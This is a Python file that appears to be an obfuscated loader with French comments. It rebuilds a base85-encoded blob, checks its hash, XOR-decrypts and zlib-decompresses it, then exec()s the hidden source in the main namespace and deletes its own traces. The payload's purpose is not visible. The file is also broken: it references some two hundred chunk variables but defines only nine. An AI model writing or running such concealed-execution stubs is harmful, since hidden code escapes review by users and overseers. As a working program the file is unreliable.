_cxW__6UE_vWcmg = 'kVNbc=1dg`s$j4x|Duow-nsKbR8@*Hdp7lxumVi&d50M)&%)|zQj{ET#>4'
_czVLmclgTNauEF = 'vz!|7NRrz&ghTN?n$Ha?#^d=57jXpHTu%C)0e9kZpTY!0qswmYHO57!p$%'
_cbVDNrU8k6Yitv = 'oluuaoe>yU!q(#goj3#+Tn>$?DhVQCkAR!a7}5-om{M)Aut{N5c$S)RSRR'
_ccFj2MSdDyL94X = '{kPj%W?pSJt{i>yi=+&T=P(*>KxCdVaCQ&FthwxKwH?GyZ)?-+o)WDi_`?'
_cfrrF_O3AE5pqA = 'Bn*h5`;`@cIQ2q_%Z7tdO)0*7$L{kAdiBP*gFZEixophyj}YD6xhs`s>fJ'
_coQ6iZDFvO7f4a = '_4Jv#t_SdV|j6^KZI9)x1H}=?8t005xL|HVb8ifDs2DJg-p&U67oFN!(qx'
_cszWq4PTaCoAHA = '5;a17lEdF=Jc8CuW?8t97neE1$kmX*ZYrcD8dkE@<vzK=p=btoKpRq_8;^'
_cqg1Ac5Yrz3705 = '?tiHwQ4Sz-l%mkSl>n>03ecRT<dI1m!*4wgFq+YS1yhfhC1>DKkm0!{qA;'
_ciIfjxYWb8Sld5 = '7SeF-Nl+y9U(L4oI=T3uqOJ*8R;(D`IPHm;*Dnq~{(?gw5A1hD'

_plsNtDAn6uuKfL = __import__('base64').b85decode(_cjz1L1KU_7G_i8 + _c_JypBqK0SCo1T + _cq01YNkVMn3u7Z + _cs5HdgMbkNRLMM + _cbaOyrsMuCMR8B + _ckxwecyNu7OR9a + _cekMH0hUFXMpYS + _ce_Yq4h_LE3gnD + _csx1YYNZRz3mjD + _cg2VmcSC0oaIrN + _croRDbfM1IF5O7 + _cdGCjVv0MMe64U + _ce5_1yxf7976zi + _cqTIeu22MWAOEr + _clkmx1A4AWtwl3 + _cisHm0D36M7i1z + _cb1iXD13oeHioa + _ckHg9pcnFKoJu0 + _cxHDqbtO44UjsK + _clR4Lq_6MvCIN_ + _cnlXS7Dfo2pkrV + _c_oDBalJldapPy + _caRF7fcKBi7Uuw + _cgiZLic1pMpOtg + _chj1h7q1SbRpDI + _czgbIZbfmxx1LH + _caIqvummYKGXLl + _cuDfyrj5Myc4xk + _cmUQnIqdlh16L2 + _caAk5IqEF_jCei + _cs3EWefZpheiyN + _cwX9HYnm4_l_Jd + _cnoojbrNF6sx6W + _czP0AlRGNpq8qy + _cgHikC8cUg1Ohc + _cvIpkipWuspv8p + _cqFhw7jZVhhLlt + _cb8kCBfpCvRKgX + _cvFtZGLavJFdtt + _ctzTWj3ZCgRktf + _czffiu0AoQv1lp + _cm0xOJ3gM3a6dI + _ccuUJV7kvkXFI6 + _cvp48E3MP4wQnr + _clJmFviZm71qIW + _cqDKR2sSeowXm4 + _cwvVyU586qtCer + _cnHFBaeh5XvfIf + _crO7JS2LmOQBjt + _chWRYvqd9PJWx1 + _ch0GfrBsigtQlT + _crwootAhW1L5Pl + _cfAryE1nU4g6dF + _cvjL8op92mbyU6 + _cz2gwpohsmvAYk + _cwo_xpMZ8bwq0i + _cjahXFWlhkHbio + _ckq22h_g0ouDjo + _cbx4SyAY7Hg1sB + _cc_bFYFCeOwbhA + _cxzc2rV0D9Rvah + _cxx38gSbLSUVXL + _cr6Ymod5MELgZ5 + _cwbLENQ_gMezIM + _cfr7TL1J18LSiK + _cxhSixcDONaeRV + _cbGPKb55Iyypqc + _chGSn2zNiGl1wS + _cwHd0qPwnGJ2SA + _cbobW1AC2IpRSn + _czPkwI56x72dg6 + _ckxcaRKMWNiZN1 + _clMLV4zvM1v4NH + _cn96VToOi_RR47 + _cmJQ089LHANrNB + _cyhdtNSBx1cN80 + _cmaDelh5_qAPyg + _cf4bS5madPMpvS + _ckZoMk6le4bnj7 + _c_522e1ozJd0Po + _cn0yrBffnO7Jqq + _ccL33cVuQv9t4c + _crO0mUSJeB9I1_ + _cncl8fGpNqiCWz + _ccXlvIRJfBR9PR + _cvcpsCrbLofpp6 + _cauECzIXubofNB + _cmqWkY9DgrGBHI + _cgVw0DhoG3n7wc + _cfm8gQAuZ1o35f + _cle95qSF3OEMPa + _cp2FKp_dsJs0PX + _cvJlqgsaRnrSRG + _chXMqh0CxyemXU + _cvRPq2adHvmeLN + _csglWavfAsyovc + _cpHMMBj39FgCiM + _cgDsvu742hhL1p + _ctT7QTv06RiKXF + _cvykE0yQm9Wuel + _cv4CQtWevFbFsi + _cqq7ytiVoP63D1 + _cyovVPR2SvoqcX + _ckYRlFvo052QbI + _cycLvxBUddG3XG + _cczAsbZbHIZFib + _chhdRvMfJtflHn + _coC6rhVKZ_SGGd + _cvL2ROV9YWYyDo + _cp9V1FPKlzK9G_ + _cfafW0jDvb0gEC + _cxiU_GaJ2JUlbc + _cgDBDRm7HZNoEi + _cavUgSABgwi2kD + _cfW_Y5E0iJNlKL + _ckqFjXEo8dQF4l + _cdZ7VMawW5hdI_ + _cxixgnMjqXXe69 + _chQUCNjU0EyANv + _cxWLDr6Mjpb5O3 + _cyKMcOIiCBgRPk + _cb6Y4tkKSqOLps + _coceOSjfek8ntM + _caSO5q7wm4a9b1 + _cl2lWImjzPfyxE + _ckJCS3cggp4i3Y + _cfoIrltXK4p4cy + _ctPlgTQ88yHrtO + _cg2ORUvGAxkhCm + _cwPoX6n2MjBDVQ + _cbxhUPItx0wybn + _ccq7MBCu7jHcOo + _c_fiZg7C1xhCIg + _caOeWDSWRrpT67 + _cxsSH6fxiECuP3 + _cocNcW44RDVI89 + _cb4IYcG3vMopKN + _cuFsR4LFb7jtuN + _cwb_aQu2UUyC0e + _cvUzJ1C62JrHKx + _cgprhsLXHdsey9 + _cvK3kOHSsP_Bky + _ch4cyTowxIq5Q6 + _claBAUf3hhsAHB + _chJvNkaeM0hibh + _ccXsldTGMiUbvH + _cf6fvyXaSPBMtO + _cqbpu4unjQMoP2 + _ck81I4kwkGtKaC + _ceCGPUXng7fL2S + _c_U1KKrGTZViaM + _coCiolNsK1HjHD + _cr_BSfCsSdfeQV + _cpUKHbFSPisRfB + _csMaD132EOk5te + _cqy2xrqMEEBaQI + _cycdks5wUE5kIr + _cseYpocFXhtXHD + _csWU0ADRlzZF9z + _cfydLoCDww8bp1 + _cygfrQXpm0dLII + _caf3ZJldqKv4ug + _c_HswwMTZ5FHuf + _ckCo6lSRlbHIQj + _clYfWBvqNskD33 + _cpYaqerqIhShIG + _cr7ItQgrg2jU2v + _czL5YioP3ruNti + _cg3ryY7sZuuf2D + _caFgMQ3vF0nr89 + _c_U4r5IG9NXw0B + _cnbRMK2Dgqz8Oj + _cwckgYqvhUSM2N + _ctP_hZizontsK7 + _cmHILOjhZ9uQjm + _cfLwZN5EqDH2NC + _ceQjFpnQQfswmu + _cj52nj3MgAFqom + _c_qmQyvW0RlEHn + _cujJU9z8pbPPgO + _cpCtQwy_cRKTQG + _co6e7yME_uTTB4 + _crCIXMg_oGstLe + _cm_OWe9uNtL0_B + _cu2uVCBaywqnDU + _clAKJyNLPEUQDe + _csEDxLTY5JioOb + _cfMpwTtmW0hyVK + _cxW__6UE_vWcmg + _czVLmclgTNauEF + _cbVDNrU8k6Yitv + _ccFj2MSdDyL94X + _cfrrF_O3AE5pqA + _coQ6iZDFvO7f4a + _cszWq4PTaCoAHA + _cqg1Ac5Yrz3705 + _ciIfjxYWb8Sld5)
if __import__('hashlib').sha256(_plsNtDAn6uuKfL).hexdigest() != '1623baf48047169be96e891ebf73524182a7a49b06645009b4fc5b435cf1c936':
    __import__('sys').exit(1)
_xuED215VvPCi82 = bytes([167, 168, 125, 78, 194, 198, 121, 143, 124, 168, 163, 197, 219, 229, 99, 128, 107, 167, 96, 127, 17, 8])
_fkzrs6onk1VRvw3 = bytes([39, 6, 133, 147, 131, 196, 23, 77, 217, 22, 180, 222, 245, 152, 186, 200, 208, 5, 189, 105, 107, 152])

def _fxv4dupgtyixYOp(_bdVhItsyF8fsIB, _kyfxDC05y2YZ_K):
    return bytes(_bdVhItsyF8fsIB[_ihXs1Al6MmJreb] ^ _kyfxDC05y2YZ_K[_ihXs1Al6MmJreb % len(_kyfxDC05y2YZ_K)] for _ihXs1Al6MmJreb in range(len(_bdVhItsyF8fsIB)))

def _fdwtZXBVJNBHCgx(_toODiRQ_AkhKgQ):
    import zlib
    return zlib.decompress(_toODiRQ_AkhKgQ) # Un seul niveau de zlib ici pour simplifier

def _fefAs_Gjh0Kw83Q():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xxKXUmg9botExM = _fxv4dupgtyixYOp(_plsNtDAn6uuKfL, _xuED215VvPCi82)
    # 2. Décompression Zlib
    _dtJVHkMWMRzcVX = _fdwtZXBVJNBHCgx(_xxKXUmg9botExM)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtJVHkMWMRzcVX.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _neFdO34mVWfplB = _main.__dict__
    _neFdO34mVWfplB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _neFdO34mVWfplB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fefAs_Gjh0Kw83Q()
try:
    del _fxv4dupgtyixYOp, _fdwtZXBVJNBHCgx, _fefAs_Gjh0Kw83Q
    del _plsNtDAn6uuKfL, _xuED215VvPCi82, _fkzrs6onk1VRvw3
except:
    pass
